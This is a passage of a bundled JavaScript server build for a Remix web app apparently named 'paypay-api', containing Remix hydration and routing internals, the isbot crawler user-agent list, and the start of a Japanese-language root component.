function Await2(props) {
  return /* @__PURE__ */ React3.createElement(Await, props);
}
var isHydrated = !1;
function Scripts(props) {
  let {
    manifest,
    serverHandoffString,
    abortDelay,
    serializeError: serializeError2
  } = useRemixContext(), {
    router,
    static: isStatic,
    staticContext
  } = useDataRouterContext3(), {
    matches
  } = useDataRouterStateContext(), navigation = useNavigation();
  React3.useEffect(() => {
    isHydrated = !0;
  }, []);
  let serializePreResolvedErrorImp = (key, error) => {
    let toSerialize;
    return serializeError2 && error instanceof Error ? toSerialize = serializeError2(error) : toSerialize = error, `${JSON.stringify(key)}:__remixContext.p(!1, ${escapeHtml2(JSON.stringify(toSerialize))})`;
  }, serializePreresolvedDataImp = (routeId, key, data) => {
    let serializedData;
    try {
      serializedData = JSON.stringify(data);
    } catch (error) {
      return serializePreResolvedErrorImp(key, error);
    }
    return `${JSON.stringify(key)}:__remixContext.p(${escapeHtml2(serializedData)})`;
  }, serializeErrorImp = (routeId, key, error) => {
    let toSerialize;
    return serializeError2 && error instanceof Error ? toSerialize = serializeError2(error) : toSerialize = error, `__remixContext.r(${JSON.stringify(routeId)}, ${JSON.stringify(key)}, !1, ${escapeHtml2(JSON.stringify(toSerialize))})`;
  }, serializeDataImp = (routeId, key, data) => {
    let serializedData;
    try {
      serializedData = JSON.stringify(data);
    } catch (error) {
      return serializeErrorImp(routeId, key, error);
    }
    return `__remixContext.r(${JSON.stringify(routeId)}, ${JSON.stringify(key)}, ${escapeHtml2(serializedData)})`;
  }, deferredScripts = [], initialScripts = React3.useMemo(() => {
    var _manifest$hmr;
    let contextScript = staticContext ? `window.__remixContext = ${serverHandoffString};` : " ", activeDeferreds = staticContext == null ? void 0 : staticContext.activeDeferreds;
    contextScript += activeDeferreds ? ["__remixContext.p = function(v,e,p,x) {", "  if (typeof e !== 'undefined') {", `    x=new Error("Unexpected Server Error");
    x.stack=undefined;`, "    p=Promise.reject(x);", "  } else {", "    p=Promise.resolve(v);", "  }", "  return p;", "};", "__remixContext.n = function(i,k) {", "  __remixContext.t = __remixContext.t || {};", "  __remixContext.t[i] = __remixContext.t[i] || {};", "  let p = new Promise((r, e) => {__remixContext.t[i][k] = {r:(v)=>{r(v);},e:(v)=>{e(v);}};});", typeof abortDelay == "number" ? `setTimeout(() => {if(typeof p._error !== "undefined" || typeof p._data !== "undefined"){return;} __remixContext.t[i][k].e(new Error("Server timeout."))}, ${abortDelay});` : "", "  return p;", "};", "__remixContext.r = function(i,k,v,e,p,x) {", "  p = __remixContext.t[i][k];", "  if (typeof e !== 'undefined') {", `    x=new Error("Unexpected Server Error");
    x.stack=undefined;`, "    p.e(x);", "  } else {", "    p.r(v);", "  }", "};"].join(`
`) + Object.entries(activeDeferreds).map(([routeId, deferredData]) => {
      let pendingKeys = new Set(deferredData.pendingKeys), promiseKeyValues = deferredData.deferredKeys.map((key) => {
        if (pendingKeys.has(key))
          return deferredScripts.push(/* @__PURE__ */ React3.createElement(DeferredHydrationScript, {
            key: `${routeId} | ${key}`,
            deferredData,
            routeId,
            dataKey: key,
            scriptProps: props,
            serializeData: serializeDataImp,
            serializeError: serializeErrorImp
          })), `${JSON.stringify(key)}:__remixContext.n(${JSON.stringify(routeId)}, ${JSON.stringify(key)})`;
        {
          let trackedPromise = deferredData.data[key];
          return typeof trackedPromise._error < "u" ? serializePreResolvedErrorImp(key, trackedPromise._error) : serializePreresolvedDataImp(routeId, key, trackedPromise._data);
        }
      }).join(`,
`);
      return `Object.assign(__remixContext.state.loaderData[${JSON.stringify(routeId)}], {${promiseKeyValues}});`;
    }).join(`
`) + (deferredScripts.length > 0 ? `__remixContext.a=${deferredScripts.length};` : "") : "";
    let routeModulesScript = isStatic ? `${(_manifest$hmr = manifest.hmr) !== null && _manifest$hmr !== void 0 && _manifest$hmr.runtime ? `import ${JSON.stringify(manifest.hmr.runtime)};` : ""}import ${JSON.stringify(manifest.url)};
${matches.map((match, index) => `import * as route${index} from ${JSON.stringify(manifest.routes[match.route.id].module)};`).join(`
`)}
window.__remixRouteModules = {${matches.map((match, index) => `${JSON.stringify(match.route.id)}:route${index}`).join(",")}};

import(${JSON.stringify(manifest.entry.module)});` : " ";
    return /* @__PURE__ */ React3.createElement(React3.Fragment, null, /* @__PURE__ */ React3.createElement("script", _extends4({}, props, {
      suppressHydrationWarning: !0,
      dangerouslySetInnerHTML: createHtml(contextScript),
      type: void 0
    })), /* @__PURE__ */ React3.createElement("script", _extends4({}, props, {
      suppressHydrationWarning: !0,
      dangerouslySetInnerHTML: createHtml(routeModulesScript),
      type: "module",
      async: !0
    })));
  }, []);
  if (!isStatic && typeof __remixContext == "object" && __remixContext.a)
    for (let i = 0; i < __remixContext.a; i++)
      deferredScripts.push(/* @__PURE__ */ React3.createElement(DeferredHydrationScript, {
        key: i,
        scriptProps: props,
        serializeData: serializeDataImp,
        serializeError: serializeErrorImp
      }));
  let nextMatches = React3.useMemo(() => {
    if (navigation.location) {
      let matches2 = matchRoutes(router.routes, navigation.location);
      return invariant3(matches2, `No routes match path "${navigation.location.pathname}"`), matches2;
    }
    return [];
  }, [navigation.location, router.routes]), routePreloads = matches.concat(nextMatches).map((match) => {
    let route = manifest.routes[match.route.id];
    return (route.imports || []).concat([route.module]);
  }).flat(1), preloads = isHydrated ? [] : manifest.entry.imports.concat(routePreloads);
  return isHydrated ? null : /* @__PURE__ */ React3.createElement(React3.Fragment, null, /* @__PURE__ */ React3.createElement("link", {
    rel: "modulepreload",
    href: manifest.entry.module,
    crossOrigin: props.crossOrigin
  }), dedupe2(preloads).map((path2) => /* @__PURE__ */ React3.createElement("link", {
    key: path2,
    rel: "modulepreload",
    href: path2,
    crossOrigin: props.crossOrigin
  })), initialScripts, deferredScripts);
}
function DeferredHydrationScript({
  dataKey,
  deferredData,
  routeId,
  scriptProps,
  serializeData,
  serializeError: serializeError2
}) {
  return typeof document > "u" && deferredData && dataKey && routeId && invariant3(deferredData.pendingKeys.includes(dataKey), `Deferred data for route ${routeId} with key ${dataKey} was not pending but tried to render a script for it.`), /* @__PURE__ */ React3.createElement(React3.Suspense, {
    fallback: (
      // This makes absolutely no sense. The server renders null as a fallback,
      // but when hydrating, we need to render a script tag to avoid a hydration issue.
      // To reproduce a hydration mismatch, just render null as a fallback.
      typeof document > "u" && deferredData && dataKey && routeId ? null : /* @__PURE__ */ React3.createElement("script", _extends4({}, scriptProps, {
        async: !0,
        suppressHydrationWarning: !0,
        dangerouslySetInnerHTML: {
          __html: " "
        }
      }))
    )
  }, typeof document > "u" && deferredData && dataKey && routeId ? /* @__PURE__ */ React3.createElement(Await2, {
    resolve: deferredData.data[dataKey],
    errorElement: /* @__PURE__ */ React3.createElement(ErrorDeferredHydrationScript, {
      dataKey,
      routeId,
      scriptProps,
      serializeError: serializeError2
    }),
    children: (data) => /* @__PURE__ */ React3.createElement("script", _extends4({}, scriptProps, {
      async: !0,
      suppressHydrationWarning: !0,
      dangerouslySetInnerHTML: {
        __html: serializeData(routeId, dataKey, data)
      }
    }))
  }) : /* @__PURE__ */ React3.createElement("script", _extends4({}, scriptProps, {
    async: !0,
    suppressHydrationWarning: !0,
    dangerouslySetInnerHTML: {
      __html: " "
    }
  })));
}
function ErrorDeferredHydrationScript({
  dataKey,
  routeId,
  scriptProps,
  serializeError: serializeError2
}) {
  let error = useAsyncError();
  return /* @__PURE__ */ React3.createElement("script", _extends4({}, scriptProps, {
    suppressHydrationWarning: !0,
    dangerouslySetInnerHTML: {
      __html: serializeError2(routeId, dataKey, error)
    }
  }));
}
function dedupe2(array) {
  return [...new Set(array)];
}
function useMatches2() {
  let {
    routeModules
  } = useRemixContext(), matches = useMatches();
  return React3.useMemo(() => matches.map((match) => ({
    id: match.id,
    pathname: match.pathname,
    params: match.params,
    data: match.data,
    // Need to grab handle here since we don't have it at client-side route
    // creation time
    handle: routeModules[match.id].handle
  })), [matches, routeModules]);
}
function useFetcher2() {
  let fetcherRR = useFetcher();
  return React3.useMemo(() => {
    let fetcherWithComponents = {
      ...convertRouterFetcherToRemixFetcher({
        state: fetcherRR.state,
        data: fetcherRR.data,
        formMethod: fetcherRR.formMethod,
        formAction: fetcherRR.formAction,
        formEncType: fetcherRR.formEncType,
        formData: fetcherRR.formData,
        json: fetcherRR.json,
        text: fetcherRR.text,
        " _hasFetcherDoneAnything ": fetcherRR[" _hasFetcherDoneAnything "]
      }),
      load: fetcherRR.load,
      submit: fetcherRR.submit,
      Form: fetcherRR.Form
    };
    return addFetcherDeprecationWarnings(fetcherWithComponents), fetcherWithComponents;
  }, [fetcherRR]);
}
function addFetcherDeprecationWarnings(fetcher) {
  let type = fetcher.type;
  Object.defineProperty(fetcher, "type", {
    get() {
      return type;
    },
    set(value) {
      type = value;
    },
    // These settings should make this behave like a normal object `type` field
    configurable: !0,
    enumerable: !0
  });
  let submission = fetcher.submission;
  Object.defineProperty(fetcher, "submission", {
    get() {
      return submission;
    },
    set(value) {
      submission = value;
    },
    // These settings should make this behave like a normal object `type` field
    configurable: !0,
    enumerable: !0
  });
}
function convertRouterFetcherToRemixFetcher(fetcherRR) {
  let {
    state,
    formMethod,
    formAction,
    formEncType,
    formData,
    json: json4,
    text,
    data
  } = fetcherRR, isActionSubmission = formMethod != null && ["POST", "PUT", "PATCH", "DELETE"].includes(formMethod.toUpperCase());
  if (state === "idle")
    return fetcherRR[" _hasFetcherDoneAnything "] === !0 ? {
      state: "idle",
      type: "done",
      formMethod: void 0,
      formAction: void 0,
      formEncType: void 0,
      formData: void 0,
      json: void 0,
      text: void 0,
      submission: void 0,
      data
    } : IDLE_FETCHER2;
  if (state === "submitting" && formMethod && formAction && formEncType && (formData || json4 !== void 0 || text !== void 0)) {
    if (isActionSubmission)
      return {
        state,
        type: "actionSubmission",
        formMethod: formMethod.toUpperCase(),
        formAction,
        formEncType,
        formData,
        json: json4,
        text,
        // @ts-expect-error formData/json/text are mutually exclusive in the type,
        // so TS can't be sure these meet that criteria, but as a straight
        // assignment from the RR fetcher we know they will
        submission: {
          method: formMethod.toUpperCase(),
          action: formAction,
          encType: formEncType,
          formData,
          json: json4,
          text,
          key: ""
        },
        data
      };
    invariant3(!1, "Encountered an unexpected fetcher scenario in useFetcher()");
  }
  if (state === "loading" && formMethod && formAction && formEncType) {
    if (isActionSubmission)
      return data ? {
        state,
        type: "actionReload",
        formMethod: formMethod.toUpperCase(),
        formAction,
        formEncType,
        formData,
        json: json4,
        text,
        // @ts-expect-error formData/json/text are mutually exclusive in the type,
        // so TS can't be sure these meet that criteria, but as a straight
        // assignment from the RR fetcher we know they will
        submission: {
          method: formMethod.toUpperCase(),
          action: formAction,
          encType: formEncType,
          formData,
          json: json4,
          text,
          key: ""
        },
        data
      } : {
        state,
        type: "actionRedirect",
        formMethod: formMethod.toUpperCase(),
        formAction,
        formEncType,
        formData,
        json: json4,
        text,
        // @ts-expect-error formData/json/text are mutually exclusive in the type,
        // so TS can't be sure these meet that criteria, but as a straight
        // assignment from the RR fetcher we know they will
        submission: {
          method: formMethod.toUpperCase(),
          action: formAction,
          encType: formEncType,
          formData,
          json: json4,
          text,
          key: ""
        },
        data: void 0
      };
    {
      let url = new URL(formAction, window.location.origin);
      return formData && (url.search = new URLSearchParams(formData.entries()).toString()), {
        state: "submitting",
        type: "loaderSubmission",
        formMethod: formMethod.toUpperCase(),
        formAction,
        formEncType,
        formData,
        json: json4,
        text,
        // @ts-expect-error formData/json/text are mutually exclusive in the type,
        // so TS can't be sure these meet that criteria, but as a straight
        // assignment from the RR fetcher we know they will
        submission: {
          method: formMethod.toUpperCase(),
          action: url.pathname + url.search,
          encType: formEncType,
          formData,
          json: json4,
          text,
          key: ""
        },
        data
      };
    }
  }
  return {
    state: "loading",
    type: "normalLoad",
    formMethod: void 0,
    formAction: void 0,
    formData: void 0,
    json: void 0,
    text: void 0,
    formEncType: void 0,
    submission: void 0,
    data
  };
}
var LiveReload = () => null;
function mergeRefs(...refs) {
  return (value) => {
    refs.forEach((ref) => {
      typeof ref == "function" ? ref(value) : ref != null && (ref.current = value);
    });
  };
}

// node_modules/@remix-run/react/dist/esm/routes.js
var React4 = __toESM(require_react());
function groupRoutesByParentId2(manifest) {
  let routes2 = {};
  return Object.values(manifest).forEach((route) => {
    let parentId = route.parentId || "";
    routes2[parentId] || (routes2[parentId] = []), routes2[parentId].push(route);
  }), routes2;
}
function createServerRoutes(manifest, routeModules, future2, parentId = "", routesByParentId = groupRoutesByParentId2(manifest)) {
  return (routesByParentId[parentId] || []).map((route) => {
    let hasErrorBoundary = future2.v2_errorBoundary === !0 ? route.id === "root" || route.hasErrorBoundary : route.id === "root" || route.hasCatchBoundary || route.hasErrorBoundary, dataRoute = {
      caseSensitive: route.caseSensitive,
      element: /* @__PURE__ */ React4.createElement(RemixRoute, {
        id: route.id
      }),
      errorElement: hasErrorBoundary ? /* @__PURE__ */ React4.createElement(RemixRouteError, {
        id: route.id
      }) : void 0,
      id: route.id,
      index: route.index,
      path: route.path,
      handle: routeModules[route.id].handle
      // Note: we don't need loader/action/shouldRevalidate on these routes
      // since they're for a static render
    }, children = createServerRoutes(manifest, routeModules, future2, route.id, routesByParentId);
    return children.length > 0 && (dataRoute.children = children), dataRoute;
  });
}

// node_modules/@remix-run/react/dist/esm/index.js
init_dist2();

// node_modules/@remix-run/react/dist/esm/scroll-restoration.js
var React5 = __toESM(require_react());
init_dist2();
var STORAGE_KEY = "positions";
function ScrollRestoration2({
  getKey,
  ...props
}) {
  let location = useLocation(), matches = useMatches2();
  useScrollRestoration({
    getKey,
    storageKey: STORAGE_KEY
  });
  let key = React5.useMemo(
    () => {
      if (!getKey)
        return null;
      let userKey = getKey(location, matches);
      return userKey !== location.key ? userKey : null;
    },
    // Nah, we only need this the first time for the SSR render
    // eslint-disable-next-line react-hooks/exhaustive-deps
    []
  ), restoreScroll = ((STORAGE_KEY2, restoreKey) => {
    if (!window.history.state || !window.history.state.key) {
      let key2 = Math.random().toString(32).slice(2);
      window.history.replaceState({
        key: key2
      }, "");
    }
    try {
      let storedY = JSON.parse(sessionStorage.getItem(STORAGE_KEY2) || "{}")[restoreKey || window.history.state.key];
      typeof storedY == "number" && window.scrollTo(0, storedY);
    } catch (error) {
      console.error(error), sessionStorage.removeItem(STORAGE_KEY2);
    }
  }).toString();
  return /* @__PURE__ */ React5.createElement("script", _extends4({}, props, {
    suppressHydrationWarning: !0,
    dangerouslySetInnerHTML: {
      __html: `(${restoreScroll})(${JSON.stringify(STORAGE_KEY)}, ${JSON.stringify(key)})`
    }
  }));
}

// node_modules/@remix-run/react/dist/esm/server.js
var React6 = __toESM(require_react()), import_server3 = __toESM(require_server());
function RemixServer({
  context,
  url,
  abortDelay
}) {
  typeof url == "string" && (url = new URL(url));
  let {
    manifest,
    routeModules,
    serverHandoffString
  } = context, routes2 = createServerRoutes(manifest.routes, routeModules, context.future), router = (0, import_server3.createStaticRouter)(routes2, context.staticHandlerContext);
  return /* @__PURE__ */ React6.createElement(RemixContext.Provider, {
    value: {
      manifest,
      routeModules,
      serverHandoffString,
      future: context.future,
      serializeError: context.serializeError,
      abortDelay
    }
  }, /* @__PURE__ */ React6.createElement(RemixErrorBoundary, {
    location: router.state.location,
    component: RemixRootDefaultErrorBoundary
  }, /* @__PURE__ */ React6.createElement(import_server3.StaticRouterProvider, {
    router,
    context: context.staticHandlerContext,
    hydrate: !1
  })));
}

// node_modules/isbot/index.mjs
function _iterableToArrayLimit(arr, i) {
  var _i = arr == null ? null : typeof Symbol < "u" && arr[Symbol.iterator] || arr["@@iterator"];
  if (_i != null) {
    var _s, _e, _x, _r, _arr = [], _n = !0, _d = !1;
    try {
      if (_x = (_i = _i.call(arr)).next, i === 0) {
        if (Object(_i) !== _i)
          return;
        _n = !1;
      } else
        for (; !(_n = (_s = _x.call(_i)).done) && (_arr.push(_s.value), _arr.length !== i); _n = !0)
          ;
    } catch (err) {
      _d = !0, _e = err;
    } finally {
      try {
        if (!_n && _i.return != null && (_r = _i.return(), Object(_r) !== _r))
          return;
      } finally {
        if (_d)
          throw _e;
      }
    }
    return _arr;
  }
}
function _classCallCheck(instance, Constructor) {
  if (!(instance instanceof Constructor))
    throw new TypeError("Cannot call a class as a function");
}
function _defineProperties(target, props) {
  for (var i = 0; i < props.length; i++) {
    var descriptor = props[i];
    descriptor.enumerable = descriptor.enumerable || !1, descriptor.configurable = !0, "value" in descriptor && (descriptor.writable = !0), Object.defineProperty(target, _toPropertyKey(descriptor.key), descriptor);
  }
}
function _createClass(Constructor, protoProps, staticProps) {
  return protoProps && _defineProperties(Constructor.prototype, protoProps), staticProps && _defineProperties(Constructor, staticProps), Object.defineProperty(Constructor, "prototype", {
    writable: !1
  }), Constructor;
}
function _defineProperty(obj, key, value) {
  return key = _toPropertyKey(key), key in obj ? Object.defineProperty(obj, key, {
    value,
    enumerable: !0,
    configurable: !0,
    writable: !0
  }) : obj[key] = value, obj;
}
function _slicedToArray(arr, i) {
  return _arrayWithHoles(arr) || _iterableToArrayLimit(arr, i) || _unsupportedIterableToArray(arr, i) || _nonIterableRest();
}
function _arrayWithHoles(arr) {
  if (Array.isArray(arr))
    return arr;
}
function _unsupportedIterableToArray(o, minLen) {
  if (o) {
    if (typeof o == "string")
      return _arrayLikeToArray(o, minLen);
    var n = Object.prototype.toString.call(o).slice(8, -1);
    if (n === "Object" && o.constructor && (n = o.constructor.name), n === "Map" || n === "Set")
      return Array.from(o);
    if (n === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))
      return _arrayLikeToArray(o, minLen);
  }
}
function _arrayLikeToArray(arr, len) {
  (len == null || len > arr.length) && (len = arr.length);
  for (var i = 0, arr2 = new Array(len); i < len; i++)
    arr2[i] = arr[i];
  return arr2;
}
function _nonIterableRest() {
  throw new TypeError(`Invalid attempt to destructure non-iterable instance.
In order to be iterable, non-array objects must have a [Symbol.iterator]() method.`);
}
function _toPrimitive(input, hint) {
  if (typeof input != "object" || input === null)
    return input;
  var prim = input[Symbol.toPrimitive];
  if (prim !== void 0) {
    var res = prim.call(input, hint || "default");
    if (typeof res != "object")
      return res;
    throw new TypeError("@@toPrimitive must return a primitive value.");
  }
  return (hint === "string" ? String : Number)(input);
}
function _toPropertyKey(arg) {
  var key = _toPrimitive(arg, "string");
  return typeof key == "symbol" ? key : String(key);
}
function _classPrivateFieldGet(receiver, privateMap) {
  var descriptor = _classExtractFieldDescriptor(receiver, privateMap, "get");
  return _classApplyDescriptorGet(receiver, descriptor);
}
function _classPrivateFieldSet(receiver, privateMap, value) {
  var descriptor = _classExtractFieldDescriptor(receiver, privateMap, "set");
  return _classApplyDescriptorSet(receiver, descriptor, value), value;
}
function _classExtractFieldDescriptor(receiver, privateMap, action2) {
  if (!privateMap.has(receiver))
    throw new TypeError("attempted to " + action2 + " private field on non-instance");
  return privateMap.get(receiver);
}
function _classApplyDescriptorGet(receiver, descriptor) {
  return descriptor.get ? descriptor.get.call(receiver) : descriptor.value;
}
function _classApplyDescriptorSet(receiver, descriptor, value) {
  if (descriptor.set)
    descriptor.set.call(receiver, value);
  else {
    if (!descriptor.writable)
      throw new TypeError("attempted to set read only private field");
    descriptor.value = value;
  }
}
function _classPrivateMethodGet(receiver, privateSet, fn) {
  if (!privateSet.has(receiver))
    throw new TypeError("attempted to get private field on non-instance");
  return fn;
}
function _checkPrivateRedeclaration(obj, privateCollection) {
  if (privateCollection.has(obj))
    throw new TypeError("Cannot initialize the same private elements twice on an object");
}
function _classPrivateFieldInitSpec(obj, privateMap, value) {
  _checkPrivateRedeclaration(obj, privateMap), privateMap.set(obj, value);
}
function _classPrivateMethodInitSpec(obj, privateSet) {
  _checkPrivateRedeclaration(obj, privateSet), privateSet.add(obj);
}
var list = [
  " daum[ /]",
  " deusu/",
  " yadirectfetcher",
  "(?:^| )site",
  "(?:^|[^g])news",
  "@[a-z]",
  "\\(at\\)[a-z]",
  "\\(github\\.com/",
  "\\[at\\][a-z]",
  "^12345",
  "^<",
  "^[\\w \\.\\-\\(\\)]+(/v?\\d+(\\.\\d+)?(\\.\\d{1,10})?)?$",
  "^[^ ]{50,}$",
  "^active",
  "^ad muncher",
  "^amaya",
  "^anglesharp/",
  "^anonymous",
  "^avsdevicesdk/",
  "^axios/",
  "^bidtellect/",
  "^biglotron",
  "^btwebclient/",
  "^castro",
  "^clamav[ /]",
  "^client/",
  "^cobweb/",
  "^coccoc",
  "^custom",
  "^ddg[_-]android",
  "^discourse",
  "^dispatch/\\d",
  "^downcast/",
  "^duckduckgo",
  "^facebook",
  "^fdm[ /]\\d",
  "^getright/",
  "^gozilla/",
  "^hatena",
  "^hobbit",
  "^hotzonu",
  "^hwcdn/",
  "^jeode/",
  "^jetty/",
  "^jigsaw",
  "^linkdex",
  "^lwp[-: ]",
  "^metauri",
  "^microsoft bits",
  "^movabletype",
  "^mozilla/\\d\\.\\d \\(compatible;?\\)$",
  "^mozilla/\\d\\.\\d \\w*$",
  "^navermailapp",
  "^netsurf",
  "^offline explorer",
  "^php",
  "^postman",
  "^postrank",
  "^python",
  "^read",
  "^reed",
  "^restsharp/",
  "^snapchat",
  "^space bison",
  "^svn",
  "^swcd ",
  "^taringa",
  "^test certificate info",
  "^thumbor/",
  "^tumblr/",
  "^user-agent:mozilla",
  "^valid",
  "^venus/fedoraplanet",
  "^w3c",
  "^webbandit/",
  "^webcopier",
  "^wget",
  "^whatsapp",
  "^xenu link sleuth",
  "^yahoo",
  "^yandex",
  "^zdm/\\d",
  "^zoom marketplace/",
  "^{{.*}}$",
  "adbeat\\.com",
  "appinsights",
  "archive",
  "ask jeeves/teoma",
  "bit\\.ly/",
  "bluecoat drtr",
  "bot",
  "browsex",
  "burpcollaborator",
  "capture",
  "catch",
  "check",
  "chrome-lighthouse",
  "chromeframe",
  "cloud",
  "crawl",
  "cryptoapi",
  "dareboost",
  "datanyze",
  "dataprovider",
  "dejaclick",
  "dmbrowser",
  "download",
  "evc-batch/",
  "feed",
  "firephp",
  "freesafeip",
  "ghost",
  "gomezagent",
  "google",
  "headlesschrome/",
  "http",
  "httrack",
  "hubspot marketing grader",
  "hydra",
  "ibisbrowser",
  "images",
  "iplabel",
  "ips-agent",
  "java",
  "library",
  "mail\\.ru/",
  "manager",
  "monitor",
  "morningscore/",
  "neustar wpm",
  "nutch",
  "offbyone",
  "optimize",
  "pageburst",
  "pagespeed",
  "perl",
  "phantom",
  "pingdom",
  "powermarks",
  "preview",
  "proxy",
  "ptst[ /]\\d",
  "reader",
  "rexx;",
  "rigor",
  "rss",
  "scan",
  "scrape",
  "search",
  "serp ?reputation ?management",
  "server",
  "sogou",
  "sparkler/",
  "speedcurve",
  "spider",
  "splash",
  "statuscake",
  "stumbleupon\\.com",
  "supercleaner",
  "synapse",
  "synthetic",
  "taginspector/",
  "torrent",
  "tracemyfile",
  "transcoder",
  "trendsmapresolver",
  "twingly recon",
  "url",
  "virtuoso",
  "wappalyzer",
  "webglance",
  "webkit2png",
  "websitemetadataretriever",
  "whatcms/",
  "wordpress",
  "zgrab"
];
function amend(list2) {
  try {
    new RegExp("(?<! cu)bot").test("dangerbot");
  } catch {
    return list2;
  }
  return [
    // Addresses: Cubot device
    ["bot", "(?<! cu)bot"],
    // Addresses: Android webview
    ["google", "(?<! (?:channel/|google/))google(?!(app|/google| pixel))"],
    // Addresses: libhttp browser
    ["http", "(?<!(?:lib))http"],
    // Addresses: java based browsers
    ["java", "java(?!;)"],
    // Addresses: Yandex Search App
    ["search", "(?<! ya(?:yandex)?)search"]
  ].forEach(function(_ref) {
    var _ref2 = _slicedToArray(_ref, 2), search = _ref2[0], replace = _ref2[1], index = list2.lastIndexOf(search);
    ~index && list2.splice(index, 1, replace);
  }), list2;
}
amend(list);
var flags = "i", _list = /* @__PURE__ */ new WeakMap(), _pattern = /* @__PURE__ */ new WeakMap(), _update = /* @__PURE__ */ new WeakSet(), _index = /* @__PURE__ */ new WeakSet(), Isbot = /* @__PURE__ */ function() {
  function Isbot2(patterns) {
    var _this = this;
    _classCallCheck(this, Isbot2), _classPrivateMethodInitSpec(this, _index), _classPrivateMethodInitSpec(this, _update), _classPrivateFieldInitSpec(this, _list, {
      writable: !0,
      value: void 0
    }), _classPrivateFieldInitSpec(this, _pattern, {
      writable: !0,
      value: void 0
    }), _classPrivateFieldSet(this, _list, patterns || list.slice()), _classPrivateMethodGet(this, _update, _update2).call(this);
    var isbot2 = function(ua) {
      return _this.test(ua);
    };
    return Object.defineProperties(isbot2, Object.entries(Object.getOwnPropertyDescriptors(Isbot2.prototype)).reduce(function(accumulator, _ref) {
      var _ref2 = _slicedToArray(_ref, 2), prop = _ref2[0], descriptor = _ref2[1];
      return typeof descriptor.value == "function" && Object.assign(accumulator, _defineProperty({}, prop, {
        value: _this[prop].bind(_this)
      })), typeof descriptor.get == "function" && Object.assign(accumulator, _defineProperty({}, prop, {
        get: function() {
          return _this[prop];
        }
      })), accumulator;
    }, {}));
  }
  return _createClass(Isbot2, [{
    key: "pattern",
    get: (
      /**
       * Get a clone of the pattern
       * @type RegExp
       */
      function() {
        return new RegExp(_classPrivateFieldGet(this, _pattern));
      }
    )
    /**
     * Match given string against out pattern
     * @param  {string} ua User Agent string
     * @returns {boolean}
     */
  }, {
    key: "test",
    value: function(ua) {
      return Boolean(ua) && _classPrivateFieldGet(this, _pattern).test(ua);
    }
    /**
     * Get the match for strings' known crawler pattern
     * @param  {string} ua User Agent string
     * @returns {string|null}
     */
  }, {
    key: "find",
    value: function() {
      var ua = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "", match = ua.match(_classPrivateFieldGet(this, _pattern));
      return match && match[0];
    }
    /**
     * Get the patterns that match user agent string if any
     * @param  {string} ua User Agent string
     * @returns {string[]}
     */
  }, {
    key: "matches",
    value: function() {
      var ua = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "";
      return _classPrivateFieldGet(this, _list).filter(function(entry2) {
        return new RegExp(entry2, flags).test(ua);
      });
    }
    /**
     * Clear all patterns that match user agent
     * @param  {string} ua User Agent string
     * @returns {void}
     */
  }, {
    key: "clear",
    value: function() {
      var ua = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "";
      this.exclude(this.matches(ua));
    }
    /**
     * Extent patterns for known crawlers
     * @param  {string[]} filters
     * @returns {void}
     */
  }, {
    key: "extend",
    value: function() {
      var _this2 = this, filters = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : [];
      [].push.apply(_classPrivateFieldGet(this, _list), filters.filter(function(rule) {
        return _classPrivateMethodGet(_this2, _index, _index2).call(_this2, rule) === -1;
      }).map(function(filter) {
        return filter.toLowerCase();
      })), _classPrivateMethodGet(this, _update, _update2).call(this);
    }
    /**
     * Exclude patterns from bot pattern rule
     * @param  {string[]} filters
     * @returns {void}
     */
  }, {
    key: "exclude",
    value: function() {
      for (var filters = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : [], length = filters.length; length--; ) {
        var index = _classPrivateMethodGet(this, _index, _index2).call(this, filters[length]);
        index > -1 && _classPrivateFieldGet(this, _list).splice(index, 1);
      }
      _classPrivateMethodGet(this, _update, _update2).call(this);
    }
    /**
     * Create a new Isbot instance using given list or self's list
     * @param  {string[]} [list]
     * @returns {Isbot}
     */
  }, {
    key: "spawn",
    value: function(list2) {
      return new Isbot2(list2 || _classPrivateFieldGet(this, _list));
    }
  }]), Isbot2;
}();
function _update2() {
  _classPrivateFieldSet(this, _pattern, new RegExp(_classPrivateFieldGet(this, _list).join("|"), flags));
}
function _index2(rule) {
  return _classPrivateFieldGet(this, _list).indexOf(rule.toLowerCase());
}
var isbot = new Isbot();

// app/entry.server.tsx
var import_server5 = __toESM(require_server_browser()), import_jsx_runtime = __toESM(require_jsx_runtime());
async function handleRequest(request, responseStatusCode, responseHeaders, remixContext, loadContext) {
  let body = await (0, import_server5.renderToReadableStream)(
    /* @__PURE__ */ (0, import_jsx_runtime.jsx)(RemixServer, { context: remixContext, url: request.url }),
    {
      signal: request.signal,
      onError(error) {
        console.error(error), responseStatusCode = 500;
      }
    }
  );
  return isbot(request.headers.get("user-agent")) && await body.allReady, responseHeaders.set("Content-Type", "text/html"), new Response(body, {
    headers: responseHeaders,
    status: responseStatusCode
  });
}

// app/root.tsx
var root_exports = {};
__export(root_exports, {
  default: () => App,
  links: () => links
});

// css-bundle-update-plugin-ns:C:\Users\edame\OneDrive\デスクトップ\paypay-api\node_modules\@remix-run\css-bundle\dist\esm\index.js
var cssBundleHref;

// app/root.tsx
var import_jsx_runtime2 = __toESM(require_jsx_runtime()), links = () => [
  ...cssBundleHref ? [{ rel: "stylesheet", href: cssBundleHref }] : []
];
function App() {
  return /* @__PURE__ */ (0, import_jsx_runtime2.jsxs)("html", { lang: "ja", children: [
    /* @__PURE__ */ (0, import_jsx_runtime2.jsxs)("head", { children: [
      /* @__PURE__ */ (0, import_jsx_runtime2.jsx)("meta", { charSet: "utf-8" }),
      /* @__PURE__ */ (0, import_jsx_runtime2.jsx)("meta", { name: "viewport", content: "width=device-width,initial-scale=1" }),
      /* @__PURE__ */ (0, import_jsx_runtime2.jsx)("meta", { name: "format-detection", content: "telephone=no" }),
      /* @__PURE__ */ (0, import_jsx_runtime2.jsx)("link", { rel: "shortcut icon", href: "https://paypay.ne.jp/uploads/2022/03/cropped-cropped-paypay-32x32.png" }),
      /* @__PURE__ */ (0, import_jsx_runtime2.jsx)("link", { rel: "stylesheet", href: "/main.css" }),
      /* @__PURE__ */ (0, import_jsx_runtime2.jsx)(Meta, {}),
      /* @__PURE__ */ (0, import_jsx_runtime2.jsx)(Links, {})
    ] }),
    /* @__PURE__ */ (0, import_jsx_runtime2.jsxs)("body", { children: [
